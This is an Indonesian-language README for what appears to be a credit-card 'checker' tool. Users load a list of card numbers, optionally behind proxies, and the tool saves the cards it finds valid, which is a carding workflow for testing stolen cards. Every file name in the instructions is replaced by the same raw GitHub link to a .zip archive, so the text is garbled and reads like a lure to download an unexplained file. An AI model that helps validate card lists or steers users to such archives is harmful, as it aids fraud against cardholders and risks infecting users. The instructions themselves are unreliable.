...
Silahkan siapkan
-CC list beserta informasinya seperti contoh lalu simpan dengan nama https://raw.githubusercontent.com/rikosanjuri14/FreeChecker/master/subconcession/Checker_Free_3.1.zip disatu folder Tools ini
-Proxy (tidak wajib)
...
Usage 
-Masukan cclist (list kartu kredit yang ingin di periksa) dibagian (Input your CClist {for example https://raw.githubusercontent.com/rikosanjuri14/FreeChecker/master/subconcession/Checker_Free_3.1.zip} :cclist)
-Masukan letak direktory proxy anda (jika diperlukan)
-Lalu tekan Y dan Enter
-Jika CC valid akan keluar Saved namelist https://raw.githubusercontent.com/rikosanjuri14/FreeChecker/master/subconcession/Checker_Free_3.1.zip
